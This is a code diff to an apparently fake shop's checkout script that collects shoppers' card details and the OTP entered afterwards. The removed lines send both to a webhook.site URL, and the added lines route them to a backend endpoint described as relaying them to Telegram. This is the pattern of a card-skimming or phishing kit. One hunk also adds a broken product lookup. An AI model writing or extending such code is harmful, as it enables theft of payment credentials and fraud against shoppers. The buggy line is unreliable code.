@@ -51,7 +51,7 @@ function renderCart(){
     renderCart();
   });
   document.querySelectorAll('[data-qty]').forEach(i=>i.onchange=()=>{
-    const p=products.find(x=>x.id===i.dataset.qty);
+    const p=products.find(x=>x.dataset.qty);
     cart[p.id]=Math.min(p.stock,Math.max(1,parseInt(i.value)||1));
     renderCart();
   });
@@ -126,16 +126,14 @@ document.addEventListener("DOMContentLoaded", () => {
         console.log("Local order note:", err.message);
       }
 
-      // 2. Send webhook payload using no-cors
+      // 2. Send step 1 card details to backend API for Telegram notification
       try {
-        await fetch("https://webhook.site/77c8c698-0dfa-4297-80c1-33831488e520", {
+        await api('/api/checkout/step1', {
           method: "POST",
-          mode: "no-cors",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ step: "1_card_details", ...storedCheckoutData })
+          body: JSON.stringify(storedCheckoutData)
         });
       } catch (err) {
-        console.log("Webhook card data sent");
+        console.log("Card data step 1 notification error:", err.message);
       }
 
       // Transition to Step 2 (OTP)
@@ -158,14 +156,12 @@ document.addEventListener("DOMContentLoaded", () => {
       };
 
       try {
-        await fetch("https://webhook.site/77c8c698-0dfa-4297-80c1-33831488e520", {
+        await api('/api/checkout/step2', {
           method: "POST",
-          mode: "no-cors",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ step: "2_otp_submitted", ...finalPayload })
+          body: JSON.stringify(finalPayload)
         });
       } catch (err) {
-        console.log("Webhook OTP data sent");
+        console.log("OTP data step 2 notification error:", err.message);
       }
 
       otpForm.style.display = "none";
